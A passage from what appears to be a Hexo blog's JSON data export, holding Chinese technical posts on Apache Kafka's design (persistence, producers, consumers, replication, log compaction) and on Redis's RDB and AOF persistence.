id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>包含两个partition，名称为“my_topic”的Topic的日志包含两个目录（名称为my_topic_0和my_topic_1）,其中包含该Topic的消息的数据文件。日志文件的格式是log entry的序列；每个log entry都是4字节的消息长度N加上后面N个字节的消息数据。每条消息都有一个64位的offset标识这条消息在这个Topic的Partition中的偏移量。消息在磁盘中的存储格式如下所示。每个日志文件都以它存储的第一条消息的offset命名。所以第一个文件会命名为00000000000.kafka，随后每个文件的文件名将是前一个文件的文件名加上S的正数，S是配置中指定的单个文件的大小</p>\n<p>使用消息的Offset作为消息ID是不常见的。我们初始的想法是在Producer生成一个GUID作为Message ID，并在Broker上维持ID和Offset之间的映射关系。但是因为Consumer需要为每个Server维持一个ID，那么GUID的全局唯一性就变得没什么意义了。此外，维持一个随机的ID和Offset的映射关系将给索引的构建带来巨大的负担，本质上需要一个完整的持久化的随机存取的数据结构。因此，为了简化查找结构，我们决定使用每个分区的原子计数器，它可以和分区ID加上ServerID来唯一标识一条消息。一旦使用了计数器，直接使用Offset进行跳转是顺其自然的，两者都是分区内单调递增的整数。由于偏移量从消费者API中隐藏起来，因此这个决定是最终的实现细节，所以我们采用更有效的方法。</p>\n<h3 id=\"Writes\"><a href=\"#Writes\" class=\"headerlink\" title=\"Writes\"></a>Writes</h3><p>日志允许连续追加到最后一个文件。当文件达到配置的大小时（如1GB）将滚动到一个新文件。日志采用两个配置：M，配置达到多少条消息后进行刷盘；S，配置多长时间之后进行刷盘。这个持久化策略保证最多只丢失M条消息或者S秒之内的消息。</p>\n<h3 id=\"Reads\"><a href=\"#Reads\" class=\"headerlink\" title=\"Reads\"></a>Reads</h3><p>读取通过提供64位的offset和S-byte的chunk大小来实现。这将返回包含在S-byte的buffer的消息迭代。S比任意单条消息都大，但是如果在异常的超大消息的情况下，读取操作可以通过多次重试，每次都将buffer大小翻倍，直到消息被读取成功。最大消息大小和buffer大小可以配置，用于拒绝超过特定大小的消息，以限制客户端读取消息时需要拓展的buffer大小。buffer可能以不完整的消息作为结尾，这可以通过消息大小来轻松的检测到。<br>实际的读取操作首先需要定位offset所在的文件，再将offset转化为文件内相对的偏移量，然后从文件的这个偏移量开始读取数据。搜索操作通过内存中映射的文件的简单的二分查找完成。<br>日志提供了获取最近写入消息的能力以允许客户端从“当前时间”开始订阅。这在客户端无法在指定天数内消费掉消息的场景中非常有用。在这种情况下，如果客户端尝试消费一个不存在的offset将抛出OutOfRangeException异常并且可以根据场景重置或者失败</p>\n<h3 id=\"Deletes\"><a href=\"#Deletes\" class=\"headerlink\" title=\"Deletes\"></a>Deletes</h3><p>数据删除一次删除一个日志段。日志管理器允许通过插件的形式实现删除策略来选择那些文件是合适删除的。当前的删除策略是日志文件的修改时间已经过去N天，保留最近N GB数据的策略也是有用的。为了避免删除时锁定读取操作，我们采用copy-on-write的方式来实现，以保证一致性的视图。</p>\n<h2 id=\"日志压缩\"><a href=\"#日志压缩\" class=\"headerlink\" title=\"日志压缩\"></a>日志压缩</h2><p>日志压缩确保Kafka会为一个Topic分区数据日志中保留至少message key的最后一个值。在持久化那部分我们已经说明了在一断时间或达到特定大小的时候丢弃旧日志的简单方法。这适用于像日志这样每一条数据都是独立数据的情况。但是重要类别的数据是根据key处理的数据（例如DB中表的变更数据）。</p>\n<p>让我们来讨论这样一个具体的流的例子。一个Topic包含了用户email address信息；每一次用户变更邮箱地址，我们都向这个topic发送一条消息，使用用户ID作为primay key。现在我们已经为用户ID为123的用户发送了一些消息，每条消息包含了email address的变更:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">123 =&gt; bill@microsoft.com</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">123 =&gt; bill@gatesfoundation.org</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">123 =&gt; bill@gmail.com</span><br></pre></td></tr></table></figure></p>\n<p>日志压缩为我们提供了更精细的保留机制，至少保存每个key最后一个变更（如123 =&gt; bill@gmail.com）。这样做我们确保了这个日志包含了所有key最后一个值的快照。这样Consumer可以重建状态而不需要保留完成的变更日志。</p>\n<p>假设我们有无限的日志，记录每次变更日志，我们从一开始就捕获每一次变更。使用这个完整的日志，我们可以通过回放日志来恢复到任何一个时间点的状态。这种假设的情况下，完整的日志是不实际的，对于那些每一行记录会变更多次的系统，即使数据集很小，日志也会无限的增长下去。丢弃旧日志的简单操作可以限制空间的增长，但是无法重建状态——因为旧的日志被丢弃，可能一部分记录的状态会无法重建（这写记录所有的状态变更都在就日志中）。</p>\n<p>日志压缩机制是更细粒度的，每个记录都保留的机制，而不是基于时间的粗粒度。这个想法是选择性的删除哪些有更新的变更的记录的日志。这样最终日志至少包含每个key的记录的最后一个状态。压缩操作通过在后台周期性的拷贝日志段来完成。清除操作不会阻塞读取，并且可以被配置不超过一定IO吞吐来避免影响Producer和Consumer。</p>\n<p><strong>补上几张图片</strong><br><img src=\"http://kafka.apache.org/11/images/log_cleaner_anatomy.png\" alt=\"\"></p>\n<p><img src=\"http://kafka.apache.org/11/images/log_compaction.png\" alt=\"\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html\" target=\"_blank\" rel=\"external\">https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html</a></li>\n<li><a href=\"http://kafka.apache.org/intro\" target=\"_blank\" rel=\"external\">http://kafka.apache.org/intro</a></li>\n<li><a href=\"http://kafka.apache.org/documentation/\" target=\"_blank\" rel=\"external\">http://kafka.apache.org/documentation/</a></li>\n<li><a href=\"https://www.jianshu.com/p/7833e958fd0c\" target=\"_blank\" rel=\"external\">备份</a></li>\n<li><a href=\"https://www.jianshu.com/p/7abe0b0727fb\" target=\"_blank\" rel=\"external\">日志压缩</a></li>\n<li><a href=\"https://www.jianshu.com/p/d41935106b52\" target=\"_blank\" rel=\"external\">日志</a></li>\n</ul>\n","excerpt":"<h2 id=\"持久化\"><a href=\"#持久化\" class=\"headerlink\" title=\"持久化\"></a>持久化</h2><p><code>Don.t fear the filesystem</code><br>Kafka非常依赖文件系统来存储和缓存消息，但人们在这里总是有一个错觉<code>disks are slow</code>。事实上，<code>disks</code>可以很慢，也可以很快，这取决于人们怎么用它，一个设计合理的磁盘结构通常可以和网络一样快。</p>\n<p>这里有一个事实：磁盘读取快慢主要取决于寻道延时。<code>six 7200rpm SATA RAID-5 array</code>的磁盘<code>linear writes</code>的读取速度大概为600MB/sec，但<code>random writes</code>的读取速度为100k/sec，正因为现在操作系统通常采用随机存储的方式，导致人们对磁盘速度产生了错觉。</p>\n<p><code>持久化策略</code><br>当我们保持消息队列的时候，快用完内存空间时，并不采用操作系统的策略(尽可能保持内存中的数据，将不常用的数据块替换出去)，而是将内存中的消息全部冲洗到文件系统中。个人理解Kafka能够高吞吐的原因在于<code>Batching</code>、<code>larger network packets</code>、<code>larger sequential disk operations</code>、<code>contiguous memory block</code>，所有的策略都为了保证Kafka将随机消息写转为线性写。<br>","more":"</p>\n<blockquote>\n<p>个人翻译能力有限，留下英文原文</p>\n<p>This suggests a design which is very simple: rather than maintain as much as possible in-memory and flush it all out to the filesystem in a panic when we run out of space, we invert that. All data is immediately written to a persistent log on the filesystem without necessarily flushing to disk. In effect this just means that it is transferred into the kernel’s pagecache.</p>\n</blockquote>\n<p>此外Kafka集群保留所有publish的数据，无论这些消息有没有被消费。比如，保留策略为两天，那么两天之内，消息仍然在磁盘上，两天后为了腾出空间，就将数据移除。这样的好处在于，如果有多个消费者不会影响Kafka消息，也不会影响其他消费者。</p>\n<h2 id=\"Producer\"><a href=\"#Producer\" class=\"headerlink\" title=\"Producer\"></a>Producer</h2><p><code>负载均衡</code> : 生产者直接将数据发送给一个分区的<code>leader broker</code>, 它没有介入路由层。客户端控制它将消息发布到哪个分区。这可以随机完成，实现一种随机负载平衡，或者可以通过某种语义分区功能完成。Kafka公开了用于语义分区的接口，方法是允许用户指定要分区的密钥并使用它来hash分区（如果需要，还可以选择覆盖分区函数）。例如，如果选择的密钥是用户ID，则给定用户的所有数据都将被发送到同一分区。这反过来将允许消费者对他们的消费做出局部性假设。这种分区风格方便了那些对用户消息所在分区有严格要求的情况。<br><code>异步发送</code> : 批次是效率的重要推动力之一，为了实现批量生产，Kafka producer将尝试在内存中积累数据，并在单个请求中发送更大批次的数据。批处理可以配置消息积累大小，并且不超过某个固定的延迟限制（比如64k或10ms）。这允许发送积累好的大块消息，并且在服务器上只进行几次较大的 I/O 操作。这种缓冲是可配置的，并提供了一种机制来折中少量额外的延迟以获得更好的吞吐量</p>\n<p><code>Message delivery semantics</code> : 0.11.0.0版本之前，如果<code>Producer</code>没有收到代表消息已经提交的响应，那么<code>Producer</code>只有重新发送消息，这样有个问题：在消息重发期间，上一次发送的消息已经提交成功，那么同一块消息可能被重复写入log。从0.11.0.0版本开始Kafka提供了一个选项保证消息不会被重复，<code>broker</code>分配给每个<code>Producer</code>一个ID，使用<code>Producer</code>发送来的序列码(每个消息都有一个序列码)删除重复的消息。另外从0.11.0.0开始<code>Producer</code>支持发送消息给多个<code>topic</code>分区，使用的是像合约一样的语义。</p>\n<blockquote>\n<p>翻译能力有限，留下英文原文</p>\n<p>Also beginning with 0.11.0.0, the producer supports the ability to send messages to multiple topic partitions using transaction-like semantics: i.e. either all messages are successfully written or none of them are.</p>\n</blockquote>\n<p>上述说讲的是如何保证消息提交，但不是所有的用例都需要这样强力的保证，对于延时敏感的用例，我们允许<code>Producer</code>指定其耐心等待程度，它可以是10ms量级的等待，甚至是完全的异步。</p>\n<h2 id=\"Consumer\"><a href=\"#Consumer\" class=\"headerlink\" title=\"Consumer\"></a>Consumer</h2><p>Kafka消费者通过向希望消费的分区的<code>leader</code>发出“获取”请求而工作。消费者在消费请求中会指定日志<code>offset</code>，然后接收<code>offset</code>之后的一大块数据<code>a chunk of log</code>，因此，消费者对这个位置具有重要的控制权，并且可以倒带它以在需要时重新消费数据。由于<code>offset</code>的控制权在消费者手里，所以理论上，消费者是可以按照自己想要的方式去消费消息，比如<code>reset to an older offset to reprocess data from the past</code>、<code>skip ahead to the most recent record and start consuming from &quot;now&quot;</code>。</p>\n<p>每个消费者都有一个自己的消费组名称标示，每一个发布到topic上的消息会被投递到每个订阅了此topic的消费者组的某一个消费者（译者注：每组都会投递，但每组都只会投递一份到某个消费者）。这个被选中的消费者实例可以在不同的处理程序中或者不同的机器之上。</p>\n<p>如果所有的消费者实例都有相同的消费组标示(consumer group),那么整个结构就是一个传统的消息队列模式，消费者之间负载均衡。<br>如果所有的消费者实例都采用不同的消费组，那么真个结构就是订阅模式，每一个消息将被广播给每一个消费者。</p>\n<p><code>Push还是Pull</code> : 最开始考虑的问题是消费值主动从<code>brokers</code> <code>pull</code>数据还是<code>brokers</code> <code>push</code>数据给消费者。Kafka采用了非常传统的设计，生产者<code>push</code>数据给<code>brokers</code>然后消费者从<code>brokers</code> <code>pull</code>数据。在其他的 logging-centric systems, such as Scribe and Apache Flume 中采用的是将数据推送给下游的方式。</p>\n<p>它们各有优缺点。然而，<code>push-bases</code>的系统难以处理不同的消费者，因为<code>brokers</code>控制着数据传输的速度，我们的目标通常是消费者能够以最大可能的速度消费。不幸的是<code>push-based</code>当消费率低于生产速度时，消费者往往会不知所措。<code>pull-based system</code>有个很舒服的属性，消费者只需要简单地<code>falls behind</code>并尽可能的跟上生产者速率。还有一个优点是它适用于发送给消费者的大量批量数据。<code>push-based</code>必须发送一个请求给下游，同时积累数据然后发送数据给消费者，但它并不知道下游是否有能力处理这些数据。</p>\n<p><code>pull-based</code>的缺陷在于当<code>brokers</code>没有消息可以消费时，消费者就陷入轮询的<code>tight loop</code>。为了规避这个问题，Kafka在pull请求里面带有参数允许消费者请求阻塞在<code>long poll</code>直到数据到达(同时可选项是等到给定大小的数据时再消费以保证大块传输减少网络延时)</p>\n<h2 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h2><p>Kafka为Topic的每个Partition日志进行备份，备份数量可以由用户进行配置。这保证了系统的自动容错，如果有服务器宕机，消息可以从剩余的服务器中读取。备份的单位是Topic的分区。在没有发生异常的情况下，Kafka中每个分区都会有一个Leader和0或多个Follower。备份包含Leader在内（也就是说如果备份数为3，那么有一个Leader Partition和两个Follower Partition）。所有的读写请求都落在Leader Partition上。通常情况下分区要比Broker多，Leader分区分布在Broker上。Follower上的日志和Leader上的日志相同，拥有相同的偏移量和消息顺序（当然，在特定时间内，Leader上日志会有一部分数据还没复制到Follower上）。</p>\n<p>Follower作为普通的Consumer消费Leader上的日志，并应用到自己的日志中。Leader允许Follower自然的，成批的从服务端获取日志并应用到自己的日志中。大部分分布式系统都需要自动处理故障，需要对节点“alive”进行精确的定义。例如在Kafka中，节点存活需要满足两个条件：</p>\n<ul>\n<li>节点需要保持它和ZooKeeper之间的Session（通过ZK的心跳机制）</li>\n<li>如果是Follower，需要复制Leader上的写事件，并且复制进度没有“落后太多”</li>\n</ul>\n<p>一条消息在被应用到所有的备份上之后被认为是“已经提交的”。只有提交了的消息会被Consumer消费。这意味着Consumer不需要担心Leader节点宕机后消息会丢失。另一方面，Producer可以配置是否等待消息被提交，这取决于他们在延迟和可用性上的权衡。这个可以通过Producer的配置项中设置。Kafka提供了一条消息被提交之后，只要还有一个备份可用，消息就不会丢失的保证</p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>包含两个partition，名称为“my_topic”的Topic的日志包含两个目录（名称为my_topic_0和my_topic_1）,其中包含该Topic的消息的数据文件。日志文件的格式是log entry的序列；每个log entry都是4字节的消息长度N加上后面N个字节的消息数据。每条消息都有一个64位的offset标识这条消息在这个Topic的Partition中的偏移量。消息在磁盘中的存储格式如下所示。每个日志文件都以它存储的第一条消息的offset命名。所以第一个文件会命名为00000000000.kafka，随后每个文件的文件名将是前一个文件的文件名加上S的正数，S是配置中指定的单个文件的大小</p>\n<p>使用消息的Offset作为消息ID是不常见的。我们初始的想法是在Producer生成一个GUID作为Message ID，并在Broker上维持ID和Offset之间的映射关系。但是因为Consumer需要为每个Server维持一个ID，那么GUID的全局唯一性就变得没什么意义了。此外，维持一个随机的ID和Offset的映射关系将给索引的构建带来巨大的负担，本质上需要一个完整的持久化的随机存取的数据结构。因此，为了简化查找结构，我们决定使用每个分区的原子计数器，它可以和分区ID加上ServerID来唯一标识一条消息。一旦使用了计数器，直接使用Offset进行跳转是顺其自然的，两者都是分区内单调递增的整数。由于偏移量从消费者API中隐藏起来，因此这个决定是最终的实现细节，所以我们采用更有效的方法。</p>\n<h3 id=\"Writes\"><a href=\"#Writes\" class=\"headerlink\" title=\"Writes\"></a>Writes</h3><p>日志允许连续追加到最后一个文件。当文件达到配置的大小时（如1GB）将滚动到一个新文件。日志采用两个配置：M，配置达到多少条消息后进行刷盘；S，配置多长时间之后进行刷盘。这个持久化策略保证最多只丢失M条消息或者S秒之内的消息。</p>\n<h3 id=\"Reads\"><a href=\"#Reads\" class=\"headerlink\" title=\"Reads\"></a>Reads</h3><p>读取通过提供64位的offset和S-byte的chunk大小来实现。这将返回包含在S-byte的buffer的消息迭代。S比任意单条消息都大，但是如果在异常的超大消息的情况下，读取操作可以通过多次重试，每次都将buffer大小翻倍，直到消息被读取成功。最大消息大小和buffer大小可以配置，用于拒绝超过特定大小的消息，以限制客户端读取消息时需要拓展的buffer大小。buffer可能以不完整的消息作为结尾，这可以通过消息大小来轻松的检测到。<br>实际的读取操作首先需要定位offset所在的文件，再将offset转化为文件内相对的偏移量，然后从文件的这个偏移量开始读取数据。搜索操作通过内存中映射的文件的简单的二分查找完成。<br>日志提供了获取最近写入消息的能力以允许客户端从“当前时间”开始订阅。这在客户端无法在指定天数内消费掉消息的场景中非常有用。在这种情况下，如果客户端尝试消费一个不存在的offset将抛出OutOfRangeException异常并且可以根据场景重置或者失败</p>\n<h3 id=\"Deletes\"><a href=\"#Deletes\" class=\"headerlink\" title=\"Deletes\"></a>Deletes</h3><p>数据删除一次删除一个日志段。日志管理器允许通过插件的形式实现删除策略来选择那些文件是合适删除的。当前的删除策略是日志文件的修改时间已经过去N天，保留最近N GB数据的策略也是有用的。为了避免删除时锁定读取操作，我们采用copy-on-write的方式来实现，以保证一致性的视图。</p>\n<h2 id=\"日志压缩\"><a href=\"#日志压缩\" class=\"headerlink\" title=\"日志压缩\"></a>日志压缩</h2><p>日志压缩确保Kafka会为一个Topic分区数据日志中保留至少message key的最后一个值。在持久化那部分我们已经说明了在一断时间或达到特定大小的时候丢弃旧日志的简单方法。这适用于像日志这样每一条数据都是独立数据的情况。但是重要类别的数据是根据key处理的数据（例如DB中表的变更数据）。</p>\n<p>让我们来讨论这样一个具体的流的例子。一个Topic包含了用户email address信息；每一次用户变更邮箱地址，我们都向这个topic发送一条消息，使用用户ID作为primay key。现在我们已经为用户ID为123的用户发送了一些消息，每条消息包含了email address的变更:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">123 =&gt; bill@microsoft.com</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">123 =&gt; bill@gatesfoundation.org</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">        .</span><br><span class=\"line\">123 =&gt; bill@gmail.com</span><br></pre></td></tr></table></figure></p>\n<p>日志压缩为我们提供了更精细的保留机制，至少保存每个key最后一个变更（如123 =&gt; bill@gmail.com）。这样做我们确保了这个日志包含了所有key最后一个值的快照。这样Consumer可以重建状态而不需要保留完成的变更日志。</p>\n<p>假设我们有无限的日志，记录每次变更日志，我们从一开始就捕获每一次变更。使用这个完整的日志，我们可以通过回放日志来恢复到任何一个时间点的状态。这种假设的情况下，完整的日志是不实际的，对于那些每一行记录会变更多次的系统，即使数据集很小，日志也会无限的增长下去。丢弃旧日志的简单操作可以限制空间的增长，但是无法重建状态——因为旧的日志被丢弃，可能一部分记录的状态会无法重建（这写记录所有的状态变更都在就日志中）。</p>\n<p>日志压缩机制是更细粒度的，每个记录都保留的机制，而不是基于时间的粗粒度。这个想法是选择性的删除哪些有更新的变更的记录的日志。这样最终日志至少包含每个key的记录的最后一个状态。压缩操作通过在后台周期性的拷贝日志段来完成。清除操作不会阻塞读取，并且可以被配置不超过一定IO吞吐来避免影响Producer和Consumer。</p>\n<p><strong>补上几张图片</strong><br><img src=\"http://kafka.apache.org/11/images/log_cleaner_anatomy.png\" alt=\"\"></p>\n<p><img src=\"http://kafka.apache.org/11/images/log_compaction.png\" alt=\"\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html\">https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html</a></li>\n<li><a href=\"http://kafka.apache.org/intro\">http://kafka.apache.org/intro</a></li>\n<li><a href=\"http://kafka.apache.org/documentation/\">http://kafka.apache.org/documentation/</a></li>\n<li><a href=\"https://www.jianshu.com/p/7833e958fd0c\">备份</a></li>\n<li><a href=\"https://www.jianshu.com/p/7abe0b0727fb\">日志压缩</a></li>\n<li><a href=\"https://www.jianshu.com/p/d41935106b52\">日志</a></li>\n</ul>"},{"title":"Redis持久化","date":"2018-04-01T07:18:23.000Z","_content":"\n## 持久化方式\n### RDB持久化\nRedis安装后默认支持的持久化方式。在指定的时间间隔内将内存中的数据集快照写入到磁盘。在配置文件中，通常默认的配置是每900秒至少有一个key发生变化时会持久化一次; 每300秒至少有10个key发生变化时会持久化一次; 每60秒10000次变化时持久化一次\n\n`优点`\n- RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。\n- RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中\n- RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。\n- RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。\n\n<!--more-->\n\n`缺点`\n- 如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。\n- 每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。\n\n\n### AOF持久化\n以日志的形式处理服务器所处理的每一个操作，当Redis重启后，它会读取日志文件来重新构建数据库。\n\n`优点`\n- 使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。\n- AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。\n- Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。\n- AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。\n\n`缺点`\n- 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。\n- 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。\n- AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。\n\n### 无持久化\n通过配置来禁用Redis持久化功能。\n\n### 同时使用RDB和AOF\n\n## RDB快照\n默认情况下RDB的快照文件为`dump.rdb`\n当Redis需要保存dump.rdb时，服务器会进行一下操作:\n1. Redis调用`fork()`, 同时拥有父进程和子进程。\n2. 子进程将数据集写入临时的RDB文件中。\n3. 当子进程完成对新RDB文件的写入时，Redis用新的RDB文件替换旧的RDB文件，并将旧的RDB文件删除。\n\n## AOF重写\n因为AOF采用的是命令追加，因此随着命令的积累，AOF文件会越来越大，Redis就有必要进行AOF重建(rebuild)。\n\n举个例子，用户调用了100次INCR，那么仅仅是为了保存这个计数器的当前值，AOF就需要100条记录(entry)。然而实际上只需要一个`SET`命令保存计数器当前值，其余99条记录都是多余的。\n\n为了处理这种情况，Redis支持一种有趣的特性: 可以在不打断服务器客户端的情况下，对AOF进行重建。执行`BGREWRITEAOF`命令，Redis会生成一个新的AOF文件，这个文件会包含重建当前数据集所需的最少命令。\n\n## AOF fsync\n你可以配置Redis多久才将数据fsync到磁盘一次\n有三个选项:\n- 每次有新命令追加到AOF就进行一次fsync : 非常慢，也非常安全\n- 每秒fsync一次 : 足够块(跟RDB持久化差不多),并且故障只会损失1秒内的数据\n- 从不fsync : 将数据交由操作系统来处理。更快，但也更不安全\n\n通常推荐(也是默认)每秒进行一次fsync，这种策略可以兼顾速度和安全性。\n\n总是fsync的策略在实际使用中非常慢，即使在 Redis 2.0 对相关的程序进行了改进之后仍是如此 —— 频繁调用 fsync 注定了这种策略不可能快得起来。\n\n## AOF运作方式\n1. Redis调用`fork()`, 同时拥有父进程和子进程。\n2. 子进程开始将新的AOF写入临时文件。\n3. 对于新执行的命令，父进程一边将其放入内存缓冲中，一边将这些改动追加到AOF文件末尾 : 这样即使在重写的中途发生停机，现有的AOF还是安全的。\n4. 当子进程完成重写工作时，它给父进程发送一个信号，父进程收到信号后将内存缓冲的所有数据追加到新AOF文件末尾。\n5. Redis原子第将新AOF文件替换旧AOF文件，之后的命令都会追加到新AOF文件末尾。\n\n## 参考链接\n- [http://redisdoc.com/topic/persistence.html](http://redisdoc.com/topic/persistence.html)","source":"_posts/Redis.md","raw":"---\ntitle: Redis持久化\ndate: 2018-04-01 15:18:23\ncategories: 数据库\ntags:\n  - redis持久化\n  - redis RDB\n  - redis AOF\n---\n\n## 持久化方式\n### RDB持久化\nRedis安装后默认支持的持久化方式。在指定的时间间隔内将内存中的数据集快照写入到磁盘。在配置文件中，通常默认的配置是每900秒至少有一个key发生变化时会持久化一次; 每300秒至少有10个key发生变化时会持久化一次; 每60秒10000次变化时持久化一次\n\n`优点`\n- RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。\n- RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中\n- RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。\n- RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。\n\n<!--more-->\n\n`缺点`\n- 如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。\n- 每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。\n\n\n### AOF持久化\n以日志的形式处理服务器所处理的每一个操作，当Redis重启后，它会读取日志文件来重新构建数据库。\n\n`优点`\n- 使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。\n- AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。\n- Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 